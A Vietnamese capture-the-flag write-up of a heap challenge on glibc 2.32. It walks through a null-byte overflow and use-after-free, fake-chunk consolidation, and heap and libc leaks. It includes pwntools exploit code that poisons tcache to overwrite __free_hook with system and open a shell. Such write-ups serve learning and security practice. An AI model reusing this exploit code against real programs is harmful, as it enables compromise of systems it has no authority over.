# USE OF CONSONLIDATION

 Cùng xem chương trình qua ida để xem cách chương trình hoạt động :

![image](https://user-images.githubusercontent.com/93699926/232078701-eeffa699-614b-49fe-b26c-ccf223607ebe.png)

Chương trình cho 4 option và sẽ chỉ thoát khi chúng ta chọn option 5.xit()
.Cùng xem qua các hàm của chương trình ta thấy hàm addbook() cho ta tạo đúng 4 chunks với size mà chúng ta yêu cầu miễn là nó <=0x500
.Ở hàm delete ta thấy như sau 

![image](https://user-images.githubusercontent.com/93699926/232079465-f19d5255-bc93-46c9-9198-13ad90a049e0.png)

nếu chúng ta muốn xóa một chunk hàm delete() sẽ gọi hàm và checkbackward và checkforward và nếu biến v3 hoặc v4 bằng 0 thì nó sẽ xóa mất cái ptr chỉ đến chunk mà mà chúng ta free
. Còn nếu v3 và v4 ==1 thì chúng ta sẽ có lỗi use after free 
.Hãy cùng kiểm tra hàm checkforward trước :

![image](https://user-images.githubusercontent.com/93699926/232081882-a3d77666-ca44-4e86-ab23-6a284b5d6b17.png)


Hàm này rất khó hiểu và các phép toán biến đổi cũng khó để giải thích nên mình đã debug chương trình và kiểm tra hàm này làm gì thì tất cả các lần mình free một chunk nào đó ở bất kỳ ở vị trí nào trong 4 chunk 
thì nó cũng sẽ chỉ đến size của top chunk và thực hiện toán tử AND <size của topchunk AND 1> và nếu kết quả trả về bằng 1 thì cnó sẽ gán v4 bằng 0 , vậy để vượt qua hàm này và set biến V4 =1 ta cần làm cho bytes cuối của topchunk size =00

Tiếp theo là hàm check checkbackward :

![image](https://user-images.githubusercontent.com/93699926/232081642-680841b9-7bb1-4395-85dc-711e476ed536.png)

Hàm này thì có vẻ đơn giản hơn khi nó chỉ thực hiện phép toán AND <(size của chunk trước chunk mình free) AND 1> và nếu kết quả bằng ) thì nó sẽ gán biến v3=1.
Vậy để vượt qua hàm này ta cần clear prev_inuse flag của chunks trước đó hay nói cách khác là làm sao để byte cuối của size của chunk trước = '00'

Và thật may khi ta có hàm edit với lỗi nullbyte overflow:

![image](https://user-images.githubusercontent.com/93699926/232083583-f827354d-407c-48dd-8af7-03d3441cba6e.png)

Hàm edit sẽ cho ta nhập đủ số ký tự ứng với size của chunk mà ta muốn edit và sau khi nhập xong nó sẽ gán thêm ký tự null ở cuối chuỗi chúng ta nhập


```
add(0, 0xf8, b'0'*8) ; có thể nhập size nào cũng được nhưng hãy để đuôi của nó 8 
add(1, 0xf8, b'1'*8) 
add(2, 0x4f8, b'2'*8)
edit(0, b'0'*0xf8)
edit(2, b'2'*0x4f8)
delete(1)

view(1)

```
![image](https://user-images.githubusercontent.com/93699926/232085765-e762693e-6477-4983-973c-5377818e108b.png)

![image](https://user-images.githubusercontent.com/93699926/232085872-51a8a663-6d83-442c-9c99-97b6a91d2af8.png)

đây là heap trước khi chúng ta free chunk1 . Như đã thấy thì ta đã thành công set byte cuối của size của chunk 0 thành '00' và byte cuối của topchunk size thành '00'
nếu giờ  ta free chunk1 thì ta sẽ có thể leak được địa chỉ heap 

Và một điều chú ý nữa đó là ở phiên bản libc 2.32 có một cơ chế bảo vệ mới được thêm vô :
<update link giải thích >

vậy bây giờ ta chỉ cần shl <giá trị leak ra << 12> thì ta sẽ có địaa chỉ của heap

```
delete(1)
view(1)
p.recvuntil(b'Book name: ')
heap_leak = p.recvline()[:-1]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
log.info("Heap leak: " + hex(heap_leak))
heap_base = heap_leak << 12
log.info("Heap base: " + hex(heap_base))
```

kế đến chúng ta cần leak thêm địa chỉ của libc để có tính được địa chỉ của hàm system sau đó ta sẽ thực hiện ghi đè __free_hook với system và ta sẽ có shell

Để có được địa chỉ của libc thì ta cần free một chunk lớn hơn so với size của tachce thread để nó có thể vô được unsorted bin , sua đó lợi dụng lỗi use after free để leak địa chỉ libc

ý tưởng là : ta sẽ free một chunk và làm nó consolidate với một chunk mà ta đã chuẩn bị và làm sao đó để chương trình nghĩ đó là một chunk đã được free trươc đó -chunk này phải ở ngay trước topchunk
sau khi consolidate thì phải tao ra môt chunk thật lớn để nó được bỏ vô unsorted bin nếu không nó sẽ vô tcache như vậy thì nó sẽ vô dụng

```
---------------------
|  0x0    |  0x101   |--> chunk0
---------------------
---------------------
|data     | 0x101    |--> chunk1
---------------------
---------------------
|   data  |  0x501   |--> chunk2
---------------------
---------------------
|   data  |   0x101  |--> chunk3
---------------------
-------------------------
|   0x00  |sizeoftopchunk|--> topchunk
-------------------------
```


ta sẽ edit nó thành như sau :
```
                  ---------------------
chunk0 addres     |  0x0    |  0x101   |--> chunk0
                  ---------------------
                  ------------------------------
address           |    0x0      |      0x0      |data của chunk0
                  ------------------------------                
                  ------------------------------
fakechunk address |    0x0      |      0x1e0      |data của chunk0
                  ------------------------------     
                  ------------------------------
address           |fakechunk add|fakechunk address|data của chunk0
                  ------------------------------  
                  ---------------------
chunk1 addres     |data     | 0x100    |--> chunk1
                  ---------------------
                  ---------------------
chunk2 addres     |   0x1e0  |  0x500   |--> chunk2
                  ---------------------
                  ---------------------
chunk3 addres     |   data  |   0x101  |--> chunk3
                  ---------------------
                  ------------------------------
address           |chunk3 addres|chunk3 addres  |data của chunk3
                  ------------------------------

                  -------------------------
                  |   data   |sizeoftopchunk|--> topchunk
                  -------------------------
```
Như ta có thể thấy ở hình ta sẽ edit phần data của chunk0 và tạo ra 1 fakechunk và làm như là nó đã được free trước nó khi fw ptr và bk ptr của fakechunk của chúng ta đề chỉ về chính nó(chỉ về metadata của nó)
.0x1e0 là khoảng cách từ fakechunk của chúng ta đến chunks2 (0x100 + 0x100 là khoảng cách từ chunk0 đến chunk 2 vì ta fakechunk của chúng ta có phần metadata cáck metadata của chunk0 0x20 nên ta sẽ trừ thêm 0x20 = 0x1e0)
chunks3 chúng ta cũng sẽ tạo ra fake forward ptr và fake bk ptr chỉ đến chính nó và ta cũng cần làm cho byte cuối của topchunk size=0 để tiếp tụp có lỗi use after free
và ta cần để size của chunk3 =0x101 chứ không phải 0x100 vì ta cần chương trình hiểu rằng chunk 2 của chúng ta vẫn còn đang in use nếu không khi chúng ta free sẽ có lỗi
.và giờ khi ta free chunk2 chương trình sẽ đọc phần metadata của chun2 và thấy 0x500(prev_inuse flag của nó đã được clear ) và nó sẽ tính khoảng cách dến chunk trước đó để consolidate với chunk trước đó
và và nó sẽ chunk2 sẽ được hợp nhấy với fakechunk của chúng ta và đồng thời hợp nhất cả với chunk3 . Vì nó nghĩ chunk2 là chunk ở giữa hai chunk đã được free trước đó 
.Và trong quá trình hợp nhất thì nó sẽ overlap chunk1 và sẽ tạo ra một chunk siêu to khổng lồ vượt quá size của một tcache thread và nó sẽ đi vô unsorted bin

code thực hiện như sau 
```
add(1, 0xf8, b'1'*8)
payload = flat(
        heap_base + 0x990, heap_base + 0x990
        )
payload = payload.ljust(0xf0, b'2')
payload += flat(0x100)
add(3, 0xf8, payload)

payload = flat(
        0, 0,
        0, 0x1e0,
        heap_base + 0x2b0, heap_base + 0x2b0
        )
edit(0, payload)

payload = b'1'*0xf0 + flat(0x1e0)
edit(1, payload)

delete(2)
```

đây là heap bin sau khi ta kiểm tra:

![image](https://user-images.githubusercontent.com/93699926/232099262-66536a40-5984-4a8d-9f1a-0cef534222f9.png)

![image](https://user-images.githubusercontent.com/93699926/232100148-b2b75b28-205b-4058-bb11-231b9bd567c9.png)

![image](https://user-images.githubusercontent.com/93699926/232100483-9f013af2-da57-4670-a3dd-5ec6088b9a12.png)

vậy giờ ta có thể leak được địa chỉ của libc và tính libc base, địa chỉ của __free_hook ,system

Nhưng giờ ta lại có một vấn đề đó là ta không có bất kỳ ptr nào chỉ đến fakechunk và fakechunk sau khi hợp nhất mới là địa chỉ chứa main arena(là địa chỉ libc).
giải pháp cho việc này là ta chỉ cần malloc hai chunk có tổng =(0x1e0+0x500) malloc theo cơ chế sẽ dùng chunk free trong các bin có size phù hợp để sử dụng lại và sau đó thì phần còn lại trong
unsorted bin sẽ ứng với ptr của chunk3 mà chúng ta đang có và ta sẽ có thể leak được libc
```
delete(0)
delete(1)
add(0, 0x1d8, b'0')
add(1, 0x4f8, b'0')
add(1, 0x4f8, b'0') ; khi ta debug thì thấy dù đã add ở index1 nhưng index1 lại chỉ chunk2 (chunk2 ta đã free trước đó)nên ta sẽ gọi thêm add ở index 1 lần nữa

view(3)
p.recvuntil(b'Book name: ')
libc_leak = u64(p.recvline()[:-1] + b'\x00\x00')
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1c5cf0
log.info("Libc base: " + hex(libc.address))

```

và giờ ta sẽ overwrite địa chỉ __free_hook với system  
phần này sẽ sử dụng kỹ giống với bài house of botcake (giống thôi nhé tại nó dùng libc2.32 có thêm cái chế độ bảo vệ XOR)

```
payload = flat(
        b'\x00'*0xd8, 0x101,
        ((heap_base + 0x3a0) >> 12) ^ (libc.sym['__free_hook'])
        )
edit(0, payload[:-1])

add(0, 0xf8, b'/bin/sh\x00')
add(1, 0xf8, p64(libc.sym['system']))

delete(0)

```




